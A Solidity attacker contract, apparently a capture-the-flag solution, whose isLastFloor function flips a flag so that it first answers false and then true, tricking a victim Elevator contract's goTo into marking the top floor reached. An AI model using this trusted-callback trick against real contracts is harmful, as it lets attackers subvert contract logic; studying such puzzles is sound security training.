pragma solidity ^0.8.0;

interface Elevator{
    function goTo(uint _floor) external;
}

contract Building  {
    uint256 public lastfloor;
    bool public flag ;
    constructor(uint256 _lastfloor){
        flag = false;
        lastfloor = _lastfloor;
    }
    function isLastFloor(uint256 floor) public returns (bool){
        if(floor == lastfloor)
            if(flag){
                flag = false;
                return true;
            }
            else{
                flag = true;
                return false;
            }
        else
            return false;
    }
    function exploit(address victim) public {
        Elevator(victim).goTo(lastfloor);
    }
}
